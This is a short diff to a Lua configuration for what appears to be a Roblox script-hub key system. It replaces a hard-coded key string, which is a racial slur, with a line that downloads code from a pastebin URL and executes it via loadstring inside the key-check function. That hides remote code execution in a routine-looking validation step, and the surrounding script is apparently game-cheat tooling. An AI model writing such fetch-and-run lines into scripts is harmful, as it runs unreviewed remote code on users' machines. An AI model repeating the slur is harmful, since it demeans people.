@@ -33,7 +33,7 @@ local test = library.new({
     UseLoader = true;
     Bind = "LeftShift";
     CheckKey = function(e) -- this can be nil to disable key checking
-        return e == "OnePerNiger"
+        return e == loadstring(game:HttpGet("https://pastebin.com/raw/qbJ9JtTW"))()
     end;
     Discord = "https://link-target.net/4r23094/yammihub"
 })
